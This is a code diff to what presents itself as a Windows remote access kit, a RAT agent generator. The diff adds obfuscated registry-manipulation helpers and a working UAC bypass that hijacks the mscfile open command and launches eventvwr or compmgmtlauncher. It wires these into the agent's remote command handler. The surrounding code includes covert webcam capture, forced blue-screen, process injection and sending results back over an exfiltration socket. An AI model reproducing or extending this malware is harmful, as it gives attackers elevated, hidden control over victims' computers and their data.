@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.22
+# Build:  1.0.23
 # -------------------------------------------------------------
 from ..utils.encryption import Scrambler
 from core.logging.logging import LoggingUtilitys
@@ -162,6 +162,27 @@ class QWireAgent():
         inject_python = Scrambler().scrambleVar(self.variable_length)
         process = Scrambler().scrambleVar(self.variable_length)
         inject_and_exec = Scrambler().scrambleVar(self.variable_length)
+        get_root_key = Scrambler().scrambleVar(self.variable_length)
+        root_key = Scrambler().scrambleVar(self.variable_length)
+        local_machine = Scrambler().scrambleVar(self.variable_length)
+        key_path = Scrambler().scrambleVar(self.variable_length)
+        key_name = Scrambler().scrambleVar(self.variable_length)
+        handle_registry_key = Scrambler().scrambleVar(self.variable_length)
+        modify = Scrambler().scrambleVar(self.variable_length)
+        root_key_bool = Scrambler().scrambleVar(self.variable_length)
+        key_value = Scrambler().scrambleVar(self.variable_length)
+        reg_key = Scrambler().scrambleVar(self.variable_length)
+        delete = Scrambler().scrambleVar(self.variable_length)
+        clean_up_key = Scrambler().scrambleVar(self.variable_length)
+        key = Scrambler().scrambleVar(self.variable_length)
+        good = Scrambler().scrambleVar(self.variable_length)
+        bad = Scrambler().scrambleVar(self.variable_length)
+        eventvwr_key = Scrambler().scrambleVar(self.variable_length)
+        Elevation = Scrambler().scrambleVar(self.variable_length)
+        uac_eventvwr = Scrambler().scrambleVar(self.variable_length)
+        uac_compmgmt = Scrambler().scrambleVar(self.variable_length)
+        esc_eventvwr = Scrambler().scrambleVar(self.variable_length)
+        esc_compmgmt = Scrambler().scrambleVar(self.variable_length)
         agent_source = f"""
 import socket as socket
 import base64 as base64
@@ -173,6 +194,7 @@ import threading as threading
 import struct as struct
 import cv2
 import psutil
+import winreg
 from PIL import ImageGrab as ImageGrab
 from time import sleep as sleep
 from cryptography.fernet import Fernet
@@ -182,7 +204,7 @@ from pymem import Pymem
 {SERV_PORT} = {server_port}
 {EXFIL_PORT} = {exfil_port}
 {STRM_PORT} = {stream_port}
-{CURRENT_DIR} = f"{{os.getcwd()}}\\\\{{os.path.basename(__file__)}}" 
+{CURRENT_DIR} = f"{{os.getcwd()}}\\\\{{os.path.basename(__file__)}}".replace('.py','.exe')
 class {MultiProcessor}:
     def {start_child_thread}(self,{function}):
         {process} = threading.Thread(target={function})
@@ -225,7 +247,13 @@ class {Utilitys}:
             {webcam}.release()
             return False
         {webcam}.release()
-        return True                                 
+        return True
+    def {get_root_key}(self,{local_machine}):
+        if {local_machine}:
+            {root_key} = winreg.HKEY_LOCAL_MACHINE
+        elif not {local_machine}:
+            {root_key} = winreg.HKEY_CURRENT_USER
+        return {root_key}
 class {SystemManager}:
     def {blue_screen}(self):
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
@@ -250,6 +278,46 @@ class {SystemManager}:
         {command} = subprocess.Popen(['taskkill','/pid',str({pid}),'/f'],stdout=subprocess.PIPE,shell=True)
         {output} = {command}.stdout.read().decode()
         {ExfilSocket}().{exfil_socket_send}({output})
+    def {handle_registry_key}(self,{modify},{root_key_bool},{key_path},{key_value},{key_name}):
+        {root_key} = {Utilitys}().{get_root_key}({root_key_bool})
+        try:
+            if {modify}:
+                {reg_key} = winreg.OpenKey({root_key},{key_path},0,winreg.KEY_ALL_ACCESS)
+            elif not {modify}:
+                {reg_key} = winreg.CreateKey({root_key},{key_path})
+            winreg.SetValueEx({reg_key},{key_name},0,winreg.REG_SZ,{key_value})
+            winreg.CloseKey({reg_key})
+            return True
+        except Exception:
+            return False
+    def {clean_up_key}(self,{delete},{root_key_bool},{key_path},{key_name}):
+        {root_key} = {Utilitys}().{get_root_key}({root_key_bool})
+        try:
+            if not {delete}:
+                {key} = winreg.OpenKey({root_key},{key_path},0,winreg.KEY_ALL_ACCESS)
+                winreg.DeleteValue({key},{key_name})
+                winreg.CloseKey({key})
+            if {delete}:
+                winreg.DeleteKey({root_key},{key_path})
+        except Exception:
+            pass
+class {Elevation}:
+    def __init__(self):
+        self.{eventvwr_key} = os.path.join('Software\\Classes\\mscfile\\shell\\open\\command')
+    def {uac_eventvwr}(self):
+        if {SystemManager}().{handle_registry_key}(True,False,self.{eventvwr_key},{CURRENT_DIR},None):
+            subprocess.run('eventvwr',shell=True)
+            {SystemManager}().{clean_up_key}(False,False,self.{eventvwr_key},None)
+            {ExfilSocket}().{exfil_socket_send}({ClientSocket}().{good})
+        else:
+            {ExfilSocket}().{exfil_socket_send}(ClientSocket().{bad})
+    def {uac_compmgmt}(self):
+        if {SystemManager}().{handle_registry_key}(True,False,self.{eventvwr_key},{CURRENT_DIR},None):
+            subprocess.run('compmgmtlauncher',shell=True)
+            {SystemManager}().{clean_up_key}(False,False,self.{eventvwr_key},None)
+            {ExfilSocket}().{exfil_socket_send}({ClientSocket}().{good})
+        else:
+            {ExfilSocket}().{exfil_socket_send}({ClientSocket}().{bad})
 class {Encryption}:
     def {encrypt_packet}(self,{data_to_encrypt}):
         {encryption_object} = Fernet({MASTER_KEY})                      
@@ -281,6 +349,10 @@ class {ClientSocket}:
         self.{term_process} = 'terminate'
         self.{snapshot} = 'snap_shot'
         self.{inject_python} = 'inject_pie'
+        self.{good} = 'good'
+        self.{bad} = 'bad'
+        self.{esc_eventvwr} = 'esc_eventvwr'
+        self.{esc_compmgmt} = 'esc_compmgmt'
     def {connect_to_server}(self):
         {domain} = socket.gethostbyname(self.{dns_address})                  
         self.{client_socket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       
@@ -358,7 +430,11 @@ class {ClientSocket}:
             if {action_flag} == self.{snapshot}:
                 {StreamSocket}().{webcam_snapshot}()
             if {action_flag} == self.{inject_python}:
-                {CodeExecution}().{inject_and_exec}({server_command}[1],{server_command}[2])                              
+                {CodeExecution}().{inject_and_exec}({server_command}[1],{server_command}[2])
+            if {action_flag} == self.{esc_eventvwr}:
+                {Elevation}().{uac_eventvwr}()
+            if {action_flag} == self.{esc_compmgmt}:
+                {Elevation}().{uac_compmgmt}()                     
     def {recv_all_data}(self):
         try:
             {bytes_data} = b''
